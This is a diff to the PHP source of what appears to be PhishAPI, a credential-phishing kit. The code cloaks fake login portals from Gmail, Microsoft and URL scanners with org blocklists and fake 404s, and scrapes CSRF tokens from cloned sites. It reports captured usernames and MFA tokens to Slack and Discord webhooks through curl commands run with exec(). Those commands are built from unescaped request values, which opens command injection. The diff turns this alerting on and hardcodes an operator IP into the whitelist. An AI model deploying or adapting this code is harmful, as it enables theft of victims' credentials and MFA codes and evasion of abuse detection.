@@ -13,7 +13,7 @@ $url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_
 $parts = parse_url($url);
 $isIP = (bool)ip2long($parts['host']);
 
-$allowed = "- *Accessed Phishing Site* -";
+$allowed = "- *Accessed API Site* -";
 
 // This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -28,14 +28,14 @@ $blockorgs = array("1337 Services GmbH","31173 Services AB","321net","A1 Telekom
 //block via blacklist
 
 // UNCOMMENT AND ADD YOUR IP TO WHITELIST ONLY YOU BEFORE STARTING, THEN SWITCH COMMENTS TO ALLOW ALL BUT BLACKLIST
-//if($ip != "YOUR_IP_HERE") {
-if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true) {
+if($ip != "75.103.132.161") {
+//if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true) {
 
 // Content for Orgs to see on the Blacklist
 //echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
 // Respond With 404 Instead of Image. More Likely to Fool URL Checkers
-header('HTTP/1.0 404 not found'); 
-  
+header('HTTP/1.0 404 not found');
+
 $allowed = "- *Jedi Mind Trick Successful* -";
 
 } else {
@@ -55,9 +55,9 @@ if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}
 
 // This code retrieves the csrf token if provided
 if(isset($_REQUEST['csrftoken']) && $_REQUEST['csrftoken'] != ""){
-	$csrftoken = $_REQUEST['csrftoken'];
-	$redirurl = $_REQUEST['redirurl'];
-	
+        $csrftoken = $_REQUEST['csrftoken'];
+        $redirurl = $_REQUEST['redirurl'];
+
 $curl = curl_init();
 
 curl_setopt_array($curl, array(
@@ -89,8 +89,8 @@ if ($err) {
 
 
 
-$arr = explode("\n", $response); 
-  
+$arr = explode("\n", $response);
+
 
 
 $matchingvalue = 'name="'.$csrftoken.'"';
@@ -100,7 +100,7 @@ $content_before_string = strstr($response, $matchingvalue, true);
 
 if (false !== $content_before_string) {
     $line = count(explode(PHP_EOL, $content_before_string));
-	$line = $line - 1;
+        $line = $line - 1;
     $tokenline = $arr[$line];
 }
 
@@ -119,7 +119,7 @@ $csrfvalue = get_string_between($tokenline, 'value="', '"');
 
 echo $csrfvalue;
 
-	
+
 }
 
 // Makes Password Safe for DB
@@ -232,8 +232,8 @@ textarea {
       <a href="index.php?fakesite=1" class="w3-bar-item w3-button"><i class="fa fa-user fa-1x" aria-hidden="true" style="color: black;"></i> Fake Portal</a>
       <a href="phishingdocs/" class="w3-bar-item w3-button"><i class="fa fa-file-text fa-1x" aria-hidden="true" style="color: black;"></i> Weaponized Documents</a>
       <a href="campaigns" class="w3-bar-item w3-button"><i class="fa fa-envelope fa-1x" aria-hidden="true" style="color: black;"></i> Email Campaigns</a>
-	  <a href="https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html" class="w3-bar-item w3-button" target="_blank"><i class="fa fa-question-circle fa-1x" aria-hidden="true" style="color: black;"></i> Help / About</a>
-	  <a href="config/" class="w3-bar-item w3-button"><i class="fa fa-gear fa-1x" aria-hidden="true" style="color: black;"></i> Settings</a>
+          <a href="https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html" class="w3-bar-item w3-button" target="_blank"><i class="fa fa-question-circle fa-1x" aria-hidden="true" style="color: black;"></i> Help / About</a>
+          <a href="config/" class="w3-bar-item w3-button"><i class="fa fa-gear fa-1x" aria-hidden="true" style="color: black;"></i> Settings</a>
     </div>
   </div></FORM><br><br>
 <CENTER>
@@ -283,26 +283,26 @@ CSRF_TOKEN_HERE = Leave blank unless the site you're cloning has a CSRF token. I
 <p><button class="js-emailcopybtn btn" style="width:25%">Copy to Clipboard</button></p>
 
 <script>
-var copyEmailBtn = document.querySelector('.js-emailcopybtn');  
-copyEmailBtn.addEventListener('click', function(event) {  
-  // Select the email link anchor text  
-  var emailLink = document.querySelector('.js-emaillink');  
-  var range = document.createRange();  
-  range.selectNode(emailLink);  
-  window.getSelection().addRange(range);  
+var copyEmailBtn = document.querySelector('.js-emailcopybtn');
+copyEmailBtn.addEventListener('click', function(event) {
+  // Select the email link anchor text
+  var emailLink = document.querySelector('.js-emaillink');
+  var range = document.createRange();
+  range.selectNode(emailLink);
+  window.getSelection().addRange(range);
 
-  try {  
-    // Now that we've selected the anchor text, execute the copy command  
-    var successful = document.execCommand('copy');  
-    var msg = successful ? 'successful' : 'unsuccessful';  
-    console.log('Copy email command was ' + msg);  
-  } catch(err) {  
-    console.log('Oops, unable to copy');  
-  }  
+  try {
+    // Now that we've selected the anchor text, execute the copy command
+    var successful = document.execCommand('copy');
+    var msg = successful ? 'successful' : 'unsuccessful';
+    console.log('Copy email command was ' + msg);
+  } catch(err) {
+    console.log('Oops, unable to copy');
+  }
 
   // Remove the selections - NOTE: Should use
-  // removeRange(range) when it is supported  
-  window.getSelection().removeAllRanges();  
+  // removeRange(range) when it is supported
+  window.getSelection().removeAllRanges();
 });
 </script>
 </CENTER>
@@ -345,8 +345,8 @@ if($redirect == false && !isset($redirurl)){ ?>
       <a href="index.php?fakesite=1" class="w3-bar-item w3-button"><i class="fa fa-user fa-1x" aria-hidden="true" style="color: black;"></i> Fake Portal</a>
       <a href="phishingdocs/" class="w3-bar-item w3-button"><i class="fa fa-file-text fa-1x" aria-hidden="true" style="color: black;"></i> Weaponized Documents</a>
       <a href="campaigns" class="w3-bar-item w3-button"><i class="fa fa-envelope fa-1x" aria-hidden="true" style="color: black;"></i> Email Campaigns</a>
-	  <a href="https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html" class="w3-bar-item w3-button"><i class="fa fa-question-circle fa-1x" aria-hidden="true" style="color: black;"></i> Help / About</a>
-	  <a href="config/" class="w3-bar-item w3-button"><i class="fa fa-gear fa-1x" aria-hidden="true" style="color: black;"></i> Settings</a>
+          <a href="https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html" class="w3-bar-item w3-button"><i class="fa fa-question-circle fa-1x" aria-hidden="true" style="color: black;"></i> Help / About</a>
+          <a href="config/" class="w3-bar-item w3-button"><i class="fa fa-gear fa-1x" aria-hidden="true" style="color: black;"></i> Settings</a>
     </div>
   </div></FORM><br><br>
 <CENTER><FONT COLOR="#FFFFFF"><H1>Welcome to PhishAPI</H1>
@@ -490,14 +490,14 @@ $messagediscord = "> Caught Another Phish at ".$portal."! (\[".$user."](".$slack
 }
 
 if($TroyHunt == "yes"){
-	$message = $message."\\r\\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";
-	$messagediscord = $messagediscord."\\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";
-	$messagepush = $messagepush."\\r\\nHaveIBeenPwned Hit (".number_format($haveibeenpwnedhits).")";
-	}
+        $message = $message."\\r\\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";
+        $messagediscord = $messagediscord."\\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";
+        $messagepush = $messagepush."\\r\\nHaveIBeenPwned Hit (".number_format($haveibeenpwnedhits).")";
+        }
 
 if($MFAToken != ""){
 $message = $message."\\r\\n> MFA Provided as `".$MFAToken."`";
-$messagediscord = $messagediscord."\\n> MFA Provided as `".$MFAToken."`";	
+$messagediscord = $messagediscord."\\n> MFA Provided as `".$MFAToken."`";
 $messagepush = $messagepush."\\r\\nMFA Provided as ".$MFAToken."";
 }
 
@@ -535,7 +535,7 @@ exec($cmddiscord);
 
 
 
-$allowed = "- *Accessed Phishing Site* -";
+$allowed = "- *Accessed API* -";
 }
 
 if($allowed == "- *Jedi Mind Trick Successful* -"){$jedi = 1;}else{$jedi = 0;}
@@ -552,12 +552,12 @@ $message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
 }
 
 // Set Slack Information Here
-if(isset($_REQUEST['slackchannel'])){$slackchannel = $_REQUEST['slackchannel'];}else{$slackchannel = 'general';}
-if(isset($_REQUEST['SlackIncomingWebhookURL'])){$SlackIncomingWebhookURL = $_REQUEST['SlackIncomingWebhookURL'];}else{$SlackIncomingWebhookURL = 'https://';}
+if(!isset($slackchannel)){$slackchannel = $_REQUEST['slackchannel'];}
+if(!isset($SlackIncomingWebhookURL)){$SlackIncomingWebhookURL = $_REQUEST['SlackIncomingWebhookURL'];}
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' '.$SlackIncomingWebhookURL.'';
 
 // UNCOMMENT THIS IF YOU WANT ALERTS WHEN PEOPLE VISIT THE API
-//exec($cmd);
-
+exec($cmd,$cmdresults);
+//var_dump($cmd);
 
 ?>
